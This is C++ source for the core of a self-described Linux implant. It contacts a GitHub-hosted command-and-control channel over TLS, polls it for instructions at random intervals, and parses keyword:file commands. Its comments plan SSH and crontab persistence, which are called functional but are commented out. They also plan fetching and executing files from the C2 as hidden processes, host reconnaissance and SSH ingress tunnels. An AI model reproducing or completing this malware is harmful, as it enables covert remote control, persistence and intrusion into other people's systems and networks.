// the application core class

/*
 * references:
 *
 * - random numbers: https://www.w3schools.com/cpp/cpp_howto_random_number.asp
 *
 * */

#include "core.h"
#include <iostream>
#include <string>
#include "ssh_persistence.h"
// #include "scheduled_job_persistence.h"                           // this feature has yet to be implemented
#include "read_c2_message.h"
#include <cstdlib>
#include <ctime>
#include <unistd.h>
#include <map>
#include <functional>
#include "split.h"

/* Execution Flow:
 *      1. establish C2 (GitHub) contact over TLS
 *      2. establish persistence (this needs to be commented back in)
 *          a. SSH persistence
 *          b. Crontab persistence
 *      3. begin the main loop
 *          a. establish contact at irregular interval, once per 24 hours
 *          b. read the current instruction and parse the keyword and operand (file)
 *
*/

Core::Core() {
    std::cout << "[+] Application core initialized" << '\n';
    try {
        contact_server();
        establish_persistence();                                     // after this call, file_system_locations will be populated with the locations the file has been copied to;
        loop();
    } catch (const std::exception & e) {
        std::cout << "[!] Core::Core raised a standard exception" << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] Core::Core raised an unknown error" << '\n';
    }
}

void test_function() {
    std::cout << "[+] This is the test function\n";
}

void Core::loop() {
    /* TODO
     * at this point, the implant has established C2 communication (over TLS), and the initial persistence routines have run;
     *
     * 1. establish a loop to reach back out to the C2 channel once every 10-24 hours at a random interval:
     *      - confirm contact via contact.txt
     *      - decode and read instruction
     *      - supported instructions:
     *              - run_file : file.type      -> grab the indicated file off of the C2 GH, write it to a hidden file, render it executable, and start it as a process
     *              - light_reconnaissance      -> grab current userid, username, kernel and OS versions, network interfaces, and recent user activity
     *                                          -> recent user activity: 
     *                                              - most recent 10 logons: "last | head -n 10"
     *                                              - processes of current logons: "w"
     *                                              - current logons: who
     *              - heavy_reconnaissance      -> grab running processes, user cronjobs, suid files, capabilities, world readable configs, list world readable home folders
     *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
     *      
    */
    // if (established_persistence_count < 1) {scheduled_job_persistence();}

    // https://stackoverflow.com/questions/15151480/simple-dictionary-in-c
    std::map<std::string, std::function<void(void)>> instruction_keywork_map = {   // mapping instruction keywords to the routine(s) they need to invoke

        { "instruction_test", test_function }

    };
    while (1) {

        // waiting for a 10-24 hour period
        srand(time(0));
        int random_interval = rand() % 14;                                  // random number between 0 and 14
        random_interval = random_interval + 10;                             // makes it a random number between 10 and 24
        std::cout << "[+] Sleeping for: " << random_interval << " seconds" << '\n';
        sleep(random_interval);                                             // multiply by 3600 to convert to hours

        // establishing contact with the C2 (this is necessary because such contact is spread out over days)
        std::string contact_file_contents = read_c2_message("contact.txt");
        if (contact_file_contents == "contact has been established.") {
            std::cout << "[+] Contact has been established within the C2 loop.\n";
        }

        // retrieving the days' instruction(s), parsing the message, and calling the appropriate routines
        std::string current_instruction = read_c2_message("instruction.txt");
        std::cout << "[+] Current instruction: " << current_instruction << '\n';

        // this call returns a vector of strings; keyword.at(0) is the instruction keyword, keyword.at(1) is the file/module
        std::vector<std::string> keyword = split(current_instruction, ':');
    
        std::cout << "[+] Parsed instruction keyword and operand: " << keyword.at(0) << " " << keyword.at(1) << '\n';

        // all that is left now is to write the modules and payloads themselves

    }
}
                                            // The TLS encryption of this request has been confirmed with Wireshark
                                            // consult for further changes: https://github.com/yhirose/cpp-httplib
void Core::contact_server() {

    std::string contact_file_contents = read_c2_message("contact.txt");

    std::string test_string = "contact has been established.";
    if (contact_file_contents == test_string) {
        std::cout << "[+] Contact has successfully been established." << '\n';
    } else {
        std::cout << "[!] There is a difference between the 2 messages." << '\n';
        exit(EXIT_FAILURE);
    }

}

void Core::establish_persistence() {
    std::cout << "[+] establish_persistence() routine initialized." << '\n' << "[+] Attempting to establish SSH and Cron based persistence" << '\n';

    // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
    // if (establish_crontab_persistence() == true) {established_persistence_count++;}
    //      ^^^^^ both persistence routines are functional; the code should be reviewed again before use

    std::cout << "\n[!] establish_persistence() invoked but commented out; persistence HAS NOT been established\n\n"; 

}
